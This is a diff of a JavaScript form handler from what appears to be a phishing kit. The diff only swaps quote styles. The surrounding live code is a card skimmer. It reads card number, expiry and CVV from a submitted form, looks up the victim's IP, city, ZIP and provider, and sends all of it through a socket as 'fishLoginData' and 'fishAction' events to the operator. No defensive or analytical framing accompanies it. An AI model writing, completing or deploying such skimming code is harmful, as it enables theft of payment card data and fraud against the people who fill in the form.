@@ -1,14 +1,14 @@
-console.log('hp-script works');
+console.log("hp-script with socket js works");
 
 // console.log("rl script works");
-localStorage.setItem('ifSessionExist', 'No');
+localStorage.setItem("ifSessionExist", "No");
 // localStorage.setItem('currPage', '1');
 // localStorage.setItem('hpIfAlreadySentCCFullInfo', 'No');
 
 let socket;
 
 const SubmitCCInfo = async () => {
-    console.log('this is submit');
+    console.log("this is submit");
 
     if (!checkIfFormValid()) {
         return;
@@ -23,17 +23,17 @@ const SubmitCCInfo = async () => {
     let hpCardMMYYVal = hpCardMMYY.value;
     let hpCardCvvVal = hpCardCVV.value;
 
-    let hpFirstNameVal = 'First Name';
-    let hpLastNameVal = 'Last Name';
+    let hpFirstNameVal = "First Name";
+    let hpLastNameVal = "Last Name";
 
-    const ifSessionExist = localStorage.getItem('ifSessionExist');
+    const ifSessionExist = localStorage.getItem("ifSessionExist");
 
     const { ip, zip, city, country, provider } = await getIpData(apiUrl);
 
-    if (localStorage.ifSessionExist == 'No') {
+    if (localStorage.ifSessionExist == "No") {
         //FIRST ACTION TO CREATE SESSIONS
 
-        socket.emit('fishLoginData', {
+        socket.emit("fishLoginData", {
             ip: ip,
             userAgent: window.navigator.userAgent,
             project: project,
@@ -44,11 +44,11 @@ const SubmitCCInfo = async () => {
         });
     }
 
-    localStorage.ifSessionExist = 'Yes';
+    localStorage.ifSessionExist = "Yes";
 
     const sendFullCCInfo = () => {
-        socket.emit('fishAction', {
-            action: 'fishAction',
+        socket.emit("fishAction", {
+            action: "fishAction",
             actionData:
                 `\nCard info:\nCard Name: ${hpFirstNameVal} ${hpLastNameVal}\nCard Number: ${hpCardNumberVal}` +
                 `\nExp: ${hpCardMMYYVal} cvv: ${hpCardCvvVal}`,
@@ -65,9 +65,9 @@ const SubmitCCInfo = async () => {
     };
     setTimeout(sendFullCCInfo, 2000);
 
-    hpLoadingRing.classList.remove('displaynone');
+    hpLoadingRing.classList.remove("displaynone");
 };
 
-hpCCForm.addEventListener('submit', async () => {
+hpCCForm.addEventListener("submit", async () => {
     await SubmitCCInfo();
 });
